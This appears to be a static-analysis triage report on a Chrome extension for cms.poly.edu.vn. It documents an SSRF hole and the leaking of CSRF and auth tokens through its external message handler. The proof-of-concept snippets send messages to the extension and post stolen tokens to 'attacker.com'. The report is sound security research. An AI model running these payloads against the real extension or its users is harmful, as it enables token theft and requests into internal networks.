# CoCo Analysis: bookcfenenijcoedjlpfknknlgfimopp

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 3 distinct vulnerability types

---

## Sink 1: bg_chrome_runtime_MessageExternal → fetch_resource_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bookcfenenijcoedjlpfknknlgfimopp/opgen_generated_files/bg.js
Line 965 - chrome.runtime.onMessageExternal handler with fetch to attacker-controlled URL

**Code:**

```javascript
// Background script - Entry point (background.js)
chrome.runtime.onMessageExternal.addListener(function(a, e, t) {
  switch(a.message) {
    case "fetch":
      try {
        chrome.cookies.getAll({domain: ".poly.edu.vn", partitionKey: {}}, async e => {
          e = e.filter(e => "cf_clearance" == e.name);
          e.length && await chrome.cookies.set({
            domain: ".poly.edu.vn",
            url: "https://cms.poly.edu.vn",
            name: e[0].name,
            value: e[0].value
          }),
          fetch(a.url, {headers: a.headers}) // ← attacker-controlled URL and headers
            .then(async e => {
              var a = await e.text();
              return {status: e.status, url: e.url, text: a}
            })
            .then(e => t(e)) // ← response sent back to external caller
            .catch(e => t(e))
        })
      } catch(e) {
        fetch(a.url, {headers: a.headers}) // ← attacker-controlled URL and headers
          .then(async e => {
            var a = await e.text();
            return {status: e.status, url: e.url, text: a}
          })
          .then(e => t(e)) // ← response sent back to external caller
          .catch(e => t(e))
      }
      break;

    case "fetch_post":
      let e = new FormData;
      if(a.body && a.body.length)
        for(var[s, o] of a.body)
          e.append(s, o);
      fetch(a.url, {method: "post", body: e, headers: a.headers}) // ← attacker-controlled
        .then(e => e.json())
        .then(e => t(e)) // ← response sent back to external caller
        .catch(e => t(e));
      break;
  }
  return !0
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (localhost, *.quizpoly.xyz per manifest.json externally_connectable)

**Attack:**

```javascript
// From a page on localhost or *.quizpoly.xyz domain:
chrome.runtime.sendMessage(
  "bookcfenenijcoedjlpfknknlgfimopp",
  {
    message: "fetch",
    url: "http://internal-network.local/admin/secrets",
    headers: {"Authorization": "Bearer token"}
  },
  function(response) {
    console.log("Stolen data:", response.text);
    // Exfiltrate: fetch("https://attacker.com/steal", {method: "POST", body: response.text})
  }
);

// Or use fetch_post for POST-based SSRF:
chrome.runtime.sendMessage(
  "bookcfenenijcoedjlpfknknlgfimopp",
  {
    message: "fetch_post",
    url: "http://internal-network.local/admin/delete-user",
    body: [["userId", "victim123"]],
    headers: {}
  },
  function(response) {
    console.log("Action completed:", response);
  }
);
```

**Impact:** Server-Side Request Forgery (SSRF) vulnerability allowing whitelisted external domains to make privileged cross-origin requests to arbitrary URLs (including internal networks) and receive the responses back. This enables information disclosure from internal systems, authentication bypass via privileged requests, and potential attacks on internal infrastructure.

---

## Sink 2: fetch_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bookcfenenijcoedjlpfknknlgfimopp/opgen_generated_files/bg.js
Line 265 - responseText mock from CoCo framework
This trace is part of the Sink 1 vulnerability above - the fetch responses are sent back to external callers.

**Classification:** TRUE POSITIVE (same as Sink 1)

**Reason:** This is the response flow of the SSRF vulnerability documented in Sink 1. The fetch response data flows back to the external attacker through sendResponse.

---

## Sink 3: cookies_source → sendResponseExternal_sink

**CoCo Trace:**
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/bookcfenenijcoedjlpfknknlgfimopp/opgen_generated_files/bg.js
Multiple lines (684-697) showing cookie data structure flowing to sendResponse

**Code:**

```javascript
// Background script - Entry point (background.js)
chrome.runtime.onMessageExternal.addListener(function(a, e, t) {
  switch(a.message) {
    case "get_cms_csrftoken":
      chrome.cookies.get({url: "https://cms.poly.edu.vn", name: "csrftoken"}, e => {
        t(e.value) // ← cookie value sent to external caller
      });
      break;

    case "get_token":
      chrome.storage.local.get(["token"], ({token: e}) => {
        t(e || "") // ← stored token sent to external caller
      });
      break;
  }
  return !0
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from whitelisted domains (localhost, *.quizpoly.xyz)

**Attack:**

```javascript
// From a page on localhost or *.quizpoly.xyz domain:
chrome.runtime.sendMessage(
  "bookcfenenijcoedjlpfknknlgfimopp",
  {message: "get_cms_csrftoken"},
  function(csrfToken) {
    console.log("Stolen CSRF token:", csrfToken);
    // Use token to perform privileged actions on cms.poly.edu.vn
    fetch("https://attacker.com/steal-token", {
      method: "POST",
      body: JSON.stringify({csrf: csrfToken})
    });
  }
);

chrome.runtime.sendMessage(
  "bookcfenenijcoedjlpfknknlgfimopp",
  {message: "get_token"},
  function(token) {
    console.log("Stolen auth token:", token);
    // Exfiltrate authentication token
  }
);
```

**Impact:** Information disclosure vulnerability allowing whitelisted external domains to steal sensitive authentication tokens and CSRF tokens. This enables session hijacking and CSRF attacks against the user's authenticated sessions on cms.poly.edu.vn and other services.
